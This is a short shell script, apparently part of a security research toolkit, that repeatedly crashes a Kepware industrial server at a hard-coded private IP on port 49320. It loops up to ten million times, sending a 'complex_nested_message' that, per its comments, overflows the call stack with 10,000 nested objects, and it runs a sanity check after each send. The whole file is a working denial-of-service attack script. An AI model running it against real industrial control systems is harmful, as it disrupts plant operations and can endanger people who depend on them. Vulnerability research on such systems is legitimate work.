#!/bin/sh
# Crash Kepware
#   Call stack overflow: server will crash (but due to watchdog will rise again)
#   What to expect: current instance will crash
#     - Use 10k nested objects (NUM_OF_NESTED_CRASH = 10_000)

cd ../
source ./venv/bin/activate

IP_ADDR=10.10.7.18

python3 main.py kepware $IP_ADDR 49320 "" sanity

for i in `seq 10000000`
do
  echo -----$i------
  python3 main.py kepware $IP_ADDR 49320 "" complex_nested_message &
  #sleep 3
  python3 main.py kepware $IP_ADDR 49320 "" sanity
done